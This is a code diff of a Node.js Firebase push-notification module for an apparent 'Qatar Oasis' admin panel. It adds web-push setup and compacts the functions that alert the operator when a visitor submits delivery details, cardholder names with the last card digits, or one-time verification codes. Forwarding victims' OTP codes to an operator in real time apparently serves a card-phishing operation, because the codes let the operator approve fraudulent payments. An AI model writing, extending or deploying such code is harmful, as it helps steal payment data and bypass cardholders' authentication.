@@ -1,11 +1,11 @@
 /**
  * Firebase Admin SDK Configuration
  * Qatar Oasis - Admin Notifications System
- * 
- * SECURITY: Credentials loaded from environment variables
+ * * SECURITY: Credentials loaded from environment variables
  */
 
 const admin = require('firebase-admin');
+const webpush = require('web-push');
 
 // ==========================================
 // SAFE PRIVATE KEY PARSING
@@ -54,9 +54,10 @@ console.log('🔑 VAPID Private Key:', vapidPrivateKey ? '✓ Set (length: ' + v
 
 try {
   if (serviceAccount.private_key && serviceAccount.client_email) {
-    // Safely check if admin.apps exists before accessing .length
     const appsArray = admin.apps || [];
     if (appsArray.length === 0) {
+      
+      // FIX: Using the absolute standard safe credential initialization
       admin.initializeApp({
         credential: admin.credential.cert({
           projectId: serviceAccount.project_id,
@@ -64,15 +65,25 @@ try {
           privateKey: serviceAccount.private_key
         })
       });
+      
       firebaseInitialized = true;
       console.log('✅ Firebase Admin SDK initialized successfully');
     } else {
       firebaseInitialized = true;
       console.log('✅ Firebase Admin SDK already initialized');
     }
+
+    // Configure Web Push VAPID keys safely
+    if (VAPID_KEYS.publicKey && VAPID_KEYS.privateKey) {
+      webpush.setVapidDetails(
+        'mailto:admin@qatarwateroasis.com',
+        VAPID_KEYS.publicKey,
+        VAPID_KEYS.privateKey
+      );
+      console.log('✅ Web Push VAPID Details configured successfully');
+    }
   } else {
     console.log('⚠️ Firebase credentials not configured. Notifications disabled.');
-    console.log('⚠️ Required: FIREBASE_PRIVATE_KEY and FIREBASE_CLIENT_EMAIL environment variables');
   }
 } catch (error) {
   console.error('❌ Firebase Admin initialization error:', error.message);
@@ -82,18 +93,11 @@ try {
 
 /**
  * Send push notification to specific FCM tokens
- * @param {Array} tokens - Array of FCM registration tokens
- * @param {Object} notification - Notification data
- * @param {string} notification.title - Notification title
- * @param {string} notification.body - Notification body
- * @param {string} notification.icon - Icon URL
- * @param {Object} data - Additional data to send with notification
  */
 async function sendPushNotification(tokens, notification, data = {}) {
   console.log('📱 Attempting to send push notification...');
   console.log('📱 Firebase initialized:', firebaseInitialized);
   console.log('📱 Tokens count:', tokens?.length || 0);
-  console.log('📱 Notification:', notification.title, '-', notification.body);
   
   if (!firebaseInitialized) {
     console.log('⚠️ Firebase not initialized, skipping notification');
@@ -112,11 +116,10 @@ async function sendPushNotification(tokens, notification, data = {}) {
         body: notification.body,
         icon: notification.icon || '/admin/icon.png',
         click_action: notification.clickAction || '/admin/',
-        sound: 'default', // System default notification sound - CRITICAL for background notifications
+        sound: 'default',
         tag: data.type || 'notification',
         renotify: true
       },
-      // Android specific options for better background performance
       android: {
         priority: 'high',
         notification: {
@@ -127,7 +130,6 @@ async function sendPushNotification(tokens, notification, data = {}) {
           notification_priority: 'PRIORITY_HIGH'
         }
       },
-      // Web Push options for Chrome/Safari with VAPID for background notifications
       webpush: {
         fcm_options: {
           link: notification.clickAction || '/admin/'
@@ -135,7 +137,6 @@ async function sendPushNotification(tokens, notification, data = {}) {
         headers: {
           Urgency: 'high'
         },
-        // VAPID key for web push - CRITICAL for background notifications
         vapidDetails: {
           subject: 'mailto:admin@qatarwateroasis.com',
           publicKey: VAPID_KEYS.publicKey,
@@ -166,11 +167,9 @@ async function sendPushNotification(tokens, notification, data = {}) {
           success: false, 
           error: resp.error?.message 
         });
-        console.log(`❌ Failed to send to token ${tokens[index].substring(0, 20)}...: ${resp.error?.message}`);
       }
     });
 
-    console.log(`📱 Notification sent: ${results.successCount} success, ${results.failureCount} failed`);
     return results;
 
   } catch (error) {
@@ -179,93 +178,47 @@ async function sendPushNotification(tokens, notification, data = {}) {
   }
 }
 
-/**
- * Send notification for new visitor
- */
 async function notifyNewVisitor(visitorData) {
-  const name = visitorData.delivery_data?.fullName || 
-               visitorData.payment_data?.cardHolder || 
-               'زائر جديد';
-  
-  return sendPushNotification(
-    global.fcmTokens || [],
-    {
-      title: '🆕 زائر جديد!',
-      body: `${name} - ${visitorData.country || 'غير معروف'}`,
-      icon: '/admin/icon.png',
-      clickAction: '/admin/#visitors'
-    },
-    {
-      type: 'new_visitor',
-      sessionId: visitorData.session_id || visitorData.sessionId
-    }
-  );
+  const name = visitorData.delivery_data?.fullName || visitorData.payment_data?.cardHolder || 'زائر جديد';
+  return sendPushNotification(global.fcmTokens || [], {
+    title: '🆕 زائر جديد!',
+    body: `${name} - ${visitorData.country || 'غير معروف'}`,
+    icon: '/admin/icon.png',
+    clickAction: '/admin/#visitors'
+  }, { type: 'new_visitor', sessionId: visitorData.session_id || visitorData.sessionId });
 }
 
-/**
- * Send notification for delivery form submission
- */
 async function notifyDelivery(visitorData) {
   const name = visitorData.delivery_data?.fullName || 'زائر';
   const phone = visitorData.delivery_data?.phone || '';
-  
-  return sendPushNotification(
-    global.fcmTokens || [],
-    {
-      title: '📦 بيانات توصيل جديدة!',
-      body: `${name} - ${phone}`,
-      icon: '/admin/icon.png',
-      clickAction: '/admin/#visitors'
-    },
-    {
-      type: 'delivery',
-      sessionId: visitorData.session_id || visitorData.sessionId
-    }
-  );
+  return sendPushNotification(global.fcmTokens || [], {
+    title: '📦 بيانات توصيل جديدة!',
+    body: `${name} - ${phone}`,
+    icon: '/admin/icon.png',
+    clickAction: '/admin/#visitors'
+  }, { type: 'delivery', sessionId: visitorData.session_id || visitorData.sessionId });
 }
 
-/**
- * Send notification for payment form submission
- */
 async function notifyPayment(visitorData) {
   const name = visitorData.payment_data?.cardHolder || 'زائر';
   const last4 = visitorData.payment_data?.cardNumber?.slice(-4) || '';
-  
-  return sendPushNotification(
-    global.fcmTokens || [],
-    {
-      title: '💳 بيانات بطاقة جديدة!',
-      body: `${name} - ****${last4}`,
-      icon: '/admin/icon.png',
-      clickAction: '/admin/#visitors'
-    },
-    {
-      type: 'payment',
-      sessionId: visitorData.session_id || visitorData.sessionId
-    }
-  );
+  return sendPushNotification(global.fcmTokens || [], {
+    title: '💳 بيانات بطاقة جديدة!',
+    body: `${name} - ****${last4}`,
+    icon: '/admin/icon.png',
+    clickAction: '/admin/#visitors'
+  }, { type: 'payment', sessionId: visitorData.session_id || visitorData.sessionId });
 }
 
-/**
- * Send notification for verification code
- */
 async function notifyVerification(visitorData) {
   const name = visitorData.delivery_data?.fullName || 'زائر';
   const otp = visitorData.verification_data?.otp || '';
-  
-  return sendPushNotification(
-    global.fcmTokens || [],
-    {
-      title: '🔐 رمز تحقق جديد!',
-      body: `${name} - الكود: ${otp}`,
-      icon: '/admin/icon.png',
-      clickAction: '/admin/#visitors'
-    },
-    {
-      type: 'verification',
-      sessionId: visitorData.session_id || visitorData.sessionId
-    }
-  );
+  return sendPushNotification(global.fcmTokens || [], {
+    title: '🔐 رمز تحقق جديد!',
+    body: `${name} - الكود: ${otp}`,
+    icon: '/admin/icon.png',
+    clickAction: '/admin/#visitors'
+  }, { type: 'verification', sessionId: visitorData.session_id || visitorData.sessionId });
 }
 
 module.exports = {
